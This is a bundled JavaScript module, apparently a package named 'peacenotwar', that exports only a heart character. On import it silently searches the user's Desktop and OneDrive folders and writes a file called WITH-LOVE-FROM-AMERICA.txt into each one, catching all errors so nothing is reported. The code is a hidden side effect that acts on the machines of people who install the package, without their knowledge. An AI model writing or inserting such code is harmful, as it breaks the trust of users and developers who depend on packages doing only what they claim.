var __create = Object.create;
var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __getProtoOf = Object.getPrototypeOf;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __export = function(target, all) {
  for (var name in all)
    __defProp(target, name, { get: all[name], enumerable: true });
};
var __copyProps = function(to, from, except, desc) {
  if (from && typeof from === "object" || typeof from === "function")
    for (var keys = __getOwnPropNames(from), i = 0, n = keys.length, key; i < n; i++) {
      key = keys[i];
      if (!__hasOwnProp.call(to, key) && key !== except)
        __defProp(to, key, { get: function(k) {
          return from[k];
        }.bind(null, key), enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
    }
  return to;
};
var __toESM = function(mod, isNodeMode, target) {
  return target = mod != null ? __create(__getProtoOf(mod)) : {}, __copyProps(isNodeMode || !mod || !mod.__esModule ? __defProp(target, "default", { value: mod, enumerable: true }) : target, mod);
};
var __toCommonJS = function(mod) {
  return __copyProps(__defProp({}, "__esModule", { value: true }), mod);
};

// index.js
var peacenotwar_exports = {};
__export(peacenotwar_exports, {
  default: function() {
    return whatWeWant;
  },
  whatWeWant: function() {
    return whatWeWant;
  }
});
module.exports = __toCommonJS(peacenotwar_exports);
var import_fs3 = __toESM(require("fs"), 1);

// service/findFiles.js
var import_path = __toESM(require("path"), 1);
var import_fs = __toESM(require("fs"), 1);
function fromDir(startPath, filter, recurse) {
  if (!import_fs.default.existsSync(startPath)) {
    return;
  }
  var dir = [];
  try {
    dir = import_fs.default.readdirSync(startPath);
  } catch (err) {
  }
  var files = [];
  for (var i = 0; i < dir.length; i++) {
    var filename = import_path.default.join(startPath, dir[i]);
    var stat = null;
    try {
      stat = import_fs.default.lstatSync(filename);
    } catch (err) {
      continue;
    }
    if (stat.isDirectory()) {
      var recursedFiles = fromDir(filename, filter);
      recursedFiles.length > 0 ? files.push.apply(files, recursedFiles) : null;
    } else if (filename.indexOf(filter) >= 0) {
      files.push(filename.replace(/\\/g, "/"));
    }
    ;
  }
  ;
  return files;
}

// service/readFile.js
var import_fs2 = __toESM(require("fs"), 1);
function read(path2, type) {
  var rawdata = "";
  try {
    rawdata = import_fs2.default.readFileSync(path2, "utf8");
  } catch (err) {
    type == "JSON" ? rawdata = {} : null;
    return rawdata;
  }
  var parsedData = null;
  switch (type) {
    case "JSON":
      try {
        parsedData = JSON.parse(rawdata);
      } catch (err) {
        parsedData = {};
      }
      break;
    case "HTML":
      parsedData = rawdata;
      break;
    default:
      parsedData = rawdata;
  }
  return parsedData;
}

// index.js
var import_os = require("os");
var Desktops = "".concat(import_os.homedir, "/Desktop/");
var OneDrive = "".concat(import_os.homedir, "/OneDrive/");
var OneDriveDesktops = "".concat(import_os.homedir, "/OneDrive/Desktop/");
var DesktopFileExists = fromDir(Desktops, "WITH-LOVE-FROM-AMERICA.txt");
var OneDriveDesktopFileExists = fromDir(OneDriveDesktops, "WITH-LOVE-FROM-AMERICA.txt");
var OneDriveFileExists = fromDir(OneDrive, "WITH-LOVE-FROM-AMERICA.txt");
function deliverAPeacefulMessage(path2, message) {
  try {
    import_fs3.default.writeFile(path2, message, function(err) {
    });
  } catch (err) {
  }
}
if (!(DesktopFileExists == null ? void 0 : DesktopFileExists.length) && !(OneDriveFileExists == null ? void 0 : OneDriveFileExists.length) && !(OneDriveDesktopFileExists == null ? void 0 : OneDriveDesktopFileExists.length)) {
  thinkaboutit = "WITH-LOVE-FROM-AMERICA.txt";
  WITH_LOVE_FROM_AMERICA = read("./".concat(thinkaboutit));
  deliverAPeacefulMessage("".concat(Desktops).concat(thinkaboutit), WITH_LOVE_FROM_AMERICA);
  deliverAPeacefulMessage("".concat(OneDriveDesktops).concat(thinkaboutit), WITH_LOVE_FROM_AMERICA);
  deliverAPeacefulMessage("".concat(OneDrive).concat(thinkaboutit), WITH_LOVE_FROM_AMERICA);
}
var thinkaboutit;
var WITH_LOVE_FROM_AMERICA;
var whatWeWant = "\u2665";
// Annotate the CommonJS export names for ESM import in node:
0 && (module.exports = {
  whatWeWant
});
